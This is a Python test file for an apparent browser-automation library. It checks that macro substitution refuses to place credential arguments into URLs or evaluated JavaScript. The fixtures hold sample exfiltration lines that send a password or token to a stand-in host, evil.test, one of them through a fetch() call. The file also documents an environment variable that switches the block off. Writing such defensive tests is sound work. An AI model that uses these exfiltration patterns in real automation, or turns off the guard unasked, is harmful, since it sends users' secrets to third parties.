# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""A macro must not expand a credential arg into a sink that leaks it.

``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
a caller-supplied secret to whoever authored the macro; ``evaluate`` hands it
to page JavaScript. Both are ordinary macro shapes, and neither was refused.
"""

from __future__ import annotations

import pytest

from octowright.macros.substitution import (
    credential_sinks_blocked,
    is_credential_arg,
    substitute,
)


@pytest.mark.parametrize(
    "name",
    ["password", "user_password", "api_key", "apikey", "token", "auth_token", "otp", "secret", "credential"],
)
def test_credential_arg_names_are_recognized(name: str) -> None:
    assert is_credential_arg(name)


@pytest.mark.parametrize("name", ["order_id", "username", "page", "keyword", "passenger_count"])
def test_ordinary_arg_names_are_not(name: str) -> None:
    """Over-matching would break parameterized navigation, the common pattern."""
    assert not is_credential_arg(name)


@pytest.mark.parametrize("field", ["url", "expression"])
def test_credential_into_a_leaking_sink_is_refused(field: str) -> None:
    actions = [{"action": "navigate", field: "https://evil.test/?p={{password}}"}]
    with pytest.raises(ValueError, match="credential arg"):
        substitute(actions, {"password": "hunter2"})  # pragma: allowlist secret (synthetic fixture)


def test_credential_into_a_value_field_still_works() -> None:
    """Filling a login form is the whole point -- it must keep working."""
    out = substitute([{"action": "fill", "selector": "#p", "value": "{{password}}"}], {"password": "hunter2"})
    assert out[0]["value"] == "hunter2"


def test_non_credential_arg_in_a_url_still_works() -> None:
    out = substitute([{"action": "navigate", "url": "/orders/{{order_id}}"}], {"order_id": "42"})
    assert out[0]["url"] == "/orders/42"


def test_nested_structures_inherit_the_sink() -> None:
    """A sink field holding a list/dict must not launder the credential."""
    actions = [{"action": "evaluate", "expression": ["fetch('https://evil.test/{{token}}')"]}]
    with pytest.raises(ValueError, match="credential arg"):
        substitute(actions, {"token": "abc"})


@pytest.mark.parametrize("token", ["allow", "off", "0", "false", "no", "never", "none", "disabled"])
def test_opt_out_permits_a_token_in_a_url(monkeypatch: pytest.MonkeyPatch, token: str) -> None:
    """An API-key query parameter is the legitimate case for the escape hatch."""
    monkeypatch.setenv("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", token)
    out = substitute([{"action": "navigate", "url": "https://api.test/?k={{api_key}}"}], {"api_key": "k1"})
    assert out[0]["url"] == "https://api.test/?k=k1"


def test_default_is_blocking(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", raising=False)
    assert credential_sinks_blocked() is True


def test_missing_placeholder_still_raises_keyerror() -> None:
    """The pre-existing contract is unchanged for unknown placeholders."""
    with pytest.raises(KeyError):
        substitute([{"action": "navigate", "url": "/x/{{nope}}"}], {})
